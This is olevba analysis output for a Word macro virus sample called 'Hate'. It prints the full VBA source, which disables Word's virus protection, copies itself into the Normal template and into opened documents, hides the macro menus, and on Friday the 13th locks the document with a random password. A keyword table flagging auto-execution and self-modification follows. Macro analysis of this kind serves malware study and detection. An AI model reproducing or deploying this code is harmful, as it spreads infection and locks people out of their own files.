olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hate
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hate - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hate.bas 
in file: Virus.MSWord.Hate - OLE stream: 'Macros/VBA/Hate'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.Hate.AutoOpen"
On Error Resume Next

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros = 0
    Options.VirusProtection = False

    If bNormalCheck = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Hate", Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If

    If bDocCheck = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Hate", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatTemplate
    End If

If WeekDay(Now()) = 6 And Day(Now()) = 13 Then
    For i = 1 To 15
        RndChr = Int(Rnd() * (255 - 32) + 32)
        Pw = Pw + Chr$(RndChr)
    Next
    ActiveDocument.Password = Pw
End If

End Sub

Function bNormalCheck()
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "Hate" Then bNormalCheck = True
    Next
End Function

Function bDocCheck()
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Hate" Then bDocCheck = True
    Next
End Function

Sub ToolsMacro()
End Sub

Sub FileTemplates()
End Sub

Sub ViewVBCode()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

